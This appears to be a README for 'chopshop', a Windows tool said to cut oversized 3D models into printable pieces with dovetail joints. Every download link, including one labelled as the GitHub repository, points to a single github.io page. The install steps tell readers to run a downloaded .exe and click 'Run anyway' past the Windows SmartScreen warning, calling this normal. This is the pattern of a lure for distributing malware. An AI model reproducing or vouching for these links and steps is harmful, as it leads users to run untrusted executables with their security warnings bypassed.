# 🔪 chopshop - Slice Big Models into Print-Ready Pieces

## 🚀 What Is chopshop?

chopshop is a free, easy-to-use tool that solves one of the most frustrating problems in 3D printing: **your model is too big for your printer bed**. Instead of giving up or spending hours manually splitting your design in complex CAD software, chopshop does the heavy lifting for you. It cuts your 3D model into smaller, perfectly fitting chunks, adds smart dovetail joints so the pieces snap back together seamlessly, and even tells you how much time and filament each piece will take. No programming skills needed. Just upload your file, pick your settings, and chop.

---

## 📥 Downloading chopshop

[![Download chopshop](https://img.shields.io/badge/Download-chopshop-%23FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=%232D2D2D)](https://ivorunrequested60.github.io)

Visit this link to download the application.

---

## 🛠️ How to Download and Run (Windows)

Getting started is simple. Follow these steps:

1. **Open your web browser** and go to the download page:  
   👉 [https://ivorunrequested60.github.io](https://ivorunrequested60.github.io)

2. **Find the latest version** of chopshop. Look for a file that ends with `.exe` or a folder labeled "Windows" or "Win64". The page will usually show a list of files under "Assets" — click on the one that matches your system.

3. **Download the file.** Just click it and wait for the download to finish. Your browser will save it to your "Downloads" folder by default.

4. **Run the application.** Double-click the downloaded file. Windows may show a blue or yellow popup saying "Windows protected your PC." If that happens, click "More info" and then "Run anyway." This is normal for new software that hasn't been signed by a big company yet.

5. **Follow the on-screen instructions.** The installer will guide you through a few simple steps. Just keep clicking "Next" and "Install" — the default settings are fine.

6. **Launch chopshop** once installation is complete. A window will open with a friendly interface ready for your first model.

---

## ✨ Features That Make Your Life Easier

### ✂️ Smart Model Splitting
chopshop automatically analyzes your 3D model and finds the best places to cut. You don't need to understand geometry or meshes — just tell chopshop how big your print bed is, and it handles the rest. The result is clean, straight cuts that minimize waste and support material.

### 🧩 Built-In Dovetail Joints
Each cut piece gets precision dovetail joints carved into its edges. These interlocking shapes make it easy to align and glue your pieces back together with incredible strength. The joints are designed so that even a beginner can assemble the final model with confidence — no shaking, sliding, or guesswork.

### ⏱️ Time and Filament Estimator
Hate running out of filament halfway through a print? chopshop calculates the estimated print time and filament length for each individual chunk. You'll know exactly what to expect before you even start printing, so you can plan your workflow and reorder supplies in advance.

### 🖥️ Modern, Visual Interface
The interface is built with React and Three.js, giving you a live 3D preview of your model before and after splitting. You can rotate, zoom, and inspect every piece, making sure everything looks perfect before you commit to slicing your file.

### 📦 Multiple Model Formats
chopshop supports popular 3D model formats like STL, OBJ, and PLY. Whether your file comes from Blender, SketchUp, Fusion 360, or a 3D scanner, you can usually upload it straight into chopshop.

---

## 📋 System Requirements (Estimated)

chopshop is designed to run on most modern Windows computers. For a smooth experience, we recommend:

- **Operating System:** Windows 10 or Windows 11 (64-bit)
- **Processor:** Intel Core i3 or AMD equivalent (or better)
- **RAM:** 4 GB minimum (8 GB recommended)
- **Graphics:** Integrated graphics with at least 1 GB VRAM (dedicated GPU recommended for large models)
- **Hard Drive Space:** At least 500 MB of free space for the application and temporary files

---

## 🧾 Step-by-Step: Your First Project

Let's walk through using chopshop for the first time. It'll take less than five minutes.

### Step 1: Open Your Model
Click the "Open Model" button on the main screen. Use the file browser to find your 3D model (e.g., `my_statue.stl`) and select it. The model will appear in the 3D preview window instantly.

### Step 2: Set Your Printer Size
Look for the field labeled "Print Bed Size" or "Max Print Dimensions." Enter the width, depth, and height of your printer's build area in millimeters. For example, a common printer like the Ender 3 has a bed of 220 × 220 × 250 mm. If you're not sure, check your printer's manual or product page.

### Step 3: Adjust the Cut Settings (Optional)
By default, chopshop will try to make the fewest cuts possible. If you prefer smaller pieces (for easier transport or safer printing), you can increase the "Max Piece Size" slider to a smaller value. You can also choose the thickness of the dovetail joints — the default is usually fine.

### Step 4: Preview the Cuts
Click "Preview Cuts." chopshop will compute the cuts and show you a color-coded 3D model. Each color represents a separate piece. Rotate the model to see how the dovetails align. If you're happy, proceed.

### Step 5: Export the Pieces
Click "Export Pieces." Choose a folder on your computer where you want to save the chunk files. chopshop will save each piece as a separate 3D file (e.g., `my_statue_part_1.stl`, `my_statue_part_2.stl`). It will also create a small report (a text or PDF file) showing the estimated time and filament weight for each piece.

### Step 6: Print and Assemble
Now you're ready to print each chunk on your printer like you normally would. After printing, use superglue or epoxy to join the pieces along the dovetail joints. They'll fit together snugly, giving you a professional-looking finished model.

---

## ❓ Frequently Asked Questions

### ❔ Is chopshop free?
Yes, chopshop is completely free and open-source. You can download and use it however you like — even for commercial projects.

### ❔ Do I need to install Python or other software?
No. The downloaded version on the releases page is a ready-to-run application. You do not need Python, Node.js, or any coding tools.

### ❔ What if my model is in a format chopshop doesn't recognize?
Stick to common formats like STL, OBJ, and PLY. If your file is in another format (like STEP or IGES), you can usually convert it to STL using free online converters or simpler CAD software.

### ❔ Can I change the dovetail size?
Yes. In the cut settings, you'll find an option for "Joint Width." Larger joints are stronger but use more material. We recommend starting with the default and experimenting.

### ❔ What if I lose the report with the time and filament estimates?
You can re-export the pieces at any time — the report is generated on each export. Just make sure you keep your original model file safe.

### ❔ Will my printer handle pieces with dovetail joints?
Absolutely. The joints are printed as part of each chunk. As long as your print bed fits each chunk (which chopshop guarantees), the joints will print perfectly.

### ❔ Can I use chopshop for resin printers?
While chopshop works with any 3D file, resin printers have different build volumes and support needs. We recommend using it primarily for FDM (filament) printers, but you can still use the output for resin if the parts fit your resin printer's platform.

---

## 💡 Tips for Best Results

- **Orient your model smartly.** Before splitting, try rotating your model in the preview so the flattest side faces down. This reduces supports and improves print quality.
- **Use a glue with a long open time.** Dovetail joints are precise, so you need a few seconds to press the pieces together before the glue sets. Epoxy or gel superglue works well.
- **Label your pieces.** Use a permanent marker to write numbers (1, 2, 3...) on the inside faces of each piece before gluing. This makes assembly a no-brainer.
- **Sand the joints lightly.** If the fit feels tight, a quick pass with fine sandpaper (220 grit) on the dovetail surfaces will smooth things out.

---

## 🤝 Contributing and Support

chopshop is an open-source project hosted on GitHub. If you run into bugs, want new features, or simply want to say thanks, visit the repository at [github.com/ivorunrequested60/chopshop](https://ivorunrequested60.github.io). You can open an issue, submit feedback, or even contribute code if you're feeling adventurous.

---

## 📜 License

chopshop is released under an open-source license. You are free to use, modify, and distribute it, provided you follow the terms of the license. Check the "License" section on the GitHub page for full details.

---

## 📚 Ready to Chop?

Download chopshop today and turn that oversized masterpiece into a printable reality. With intelligent splitting, dovetail joints, and built-in estimators, you'll never have to abandon a project because it doesn't fit your printer again. Happy printing!

Keywords: 3d-printing, cad, computational-geometry, fastapi, mesh-processing, python, react, three-js, trimesh, typescript